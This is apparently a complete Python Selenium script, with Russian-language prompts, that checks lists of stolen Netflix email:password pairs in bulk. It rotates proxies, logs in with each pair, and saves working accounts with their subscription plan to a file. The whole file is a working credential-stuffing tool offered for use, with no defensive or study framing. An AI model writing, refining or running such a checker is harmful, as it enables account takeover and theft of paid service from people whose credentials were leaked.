import time
import random

import selenium.common.exceptions as exceptions
from seleniumwire import webdriver


def get_proxy(path):
    proxy_list = []
    with open(path, 'r') as f:
        for line in f:
            proxy_list.append(line[0:-1])
    return proxy_list


def get_accs(path):
    accs_list = []
    with open(path, 'r') as f:
        for line in f:
            accs_list.append(line[0:-1])
    return accs_list


def check_account(proxies, accs):
    good_accs = []
    for proxy in proxies:
        options = {
            'proxy': {
                'http': f'http://{proxy}',
                'https': f'https://{proxy}',
                'no_proxy': f'localhost,127.0.0.1'  # excludes
            }
        }

        driver = webdriver.Chrome('chromedriver.exe', seleniumwire_options=options)
        driver.get('http://www.netflix.com/login')

        for i in range(5):
            if not accs:
                return good_accs

            driver.get('http://www.netflix.com/login')
            email = driver.find_element_by_xpath('/html/body/div[1]/div/div[3]/div/div/div[1]/form/div[1]/div/div/label/input')
            passw = driver.find_element_by_xpath('/html/body/div[1]/div/div[3]/div/div/div[1]/form/div[2]/div/div/label/input')
            send_data = driver.find_element_by_xpath('//*[@id="appMountPoint"]/div/div[3]/div/div/div[1]/form/button')

            credentials = random.choice(accs)
            accs.remove(credentials)

            email.send_keys(credentials.split(':')[0])
            passw.send_keys(credentials.split(':')[1])
            send_data.click()
            time.sleep(2)

            try:
                driver.find_element_by_xpath('/html/body/div[1]/div/div[3]/div/div/div[1]/div/div[2]')
                print('fail')
                driver.get('http://www.netflix.com/login')
                continue

            except exceptions.NoSuchElementException:
                print('success')
                time.sleep(2)
                driver.find_element_by_xpath('/html/body/div[1]/div/div/div[1]/div[1]/div[2]/div/div/ul/li[1]/div/a').click()

                driver.get('https://www.netflix.com/YourAccount')

                try:
                    sub = driver.find_element_by_xpath('/html/body/div[1]/div/div/div[2]/div/div/div[3]/div[2]/section/div/div/div[1]/div/b').text

                    good_accs.append(f'{credentials}:{sub}')
                except:
                    good_accs.append(f'{credentials}:no_sub')

                driver.get('https://www.netflix.com/browse')
                driver.find_element_by_xpath('/html/body/div[1]/div/div/div[1]/div[1]/div[1]/div/div/div/div[5]/div').click()
                driver.find_element_by_xpath('/html/body/div[1]/div/div/div[1]/div[1]/div[1]/div/div/div/div[5]/div/div[2]/div/''ul[3]/li[3]/a').click()
                time.sleep(2)
                driver.find_element_by_xpath('/html/body/div[1]/div/div[3]/div/a').click()
                driver.find_element_by_xpath('/html/body/div[1]/div/div/div/div/div/div[1]/div[1]/div/button').click()
                driver.find_element_by_xpath('/html/body/div[1]/div/div/div/div/div/div[1]/div[2]/a').click()

                time.sleep(2)
        print('changing proxy..')
        driver.close()

    return good_accs


def mk_checked_file(path_proxy, path_acc_database):
    with open('checked.txt', 'w+', encoding='cp1251') as f:
        try:
            for line in check_account(get_proxy(path_proxy), get_accs(path_acc_database)):
                f.write(f'{line}\n')
        except TypeError:
            print('валидных аккаунтов не обнаружено')


if __name__ == '__main__':
    print('Скрипт сделан Lalofike')
    proxy_path = input('введите название файла с прокси: ')
    accs_path = input('введите название файла с аккаунтами к netflix (email:pass): ')
    mk_checked_file(proxy_path, accs_path)
    input('Работа завершена, валидные аккаунты сохранены в checked.txt, для выхода нажмите любую кнопку...')
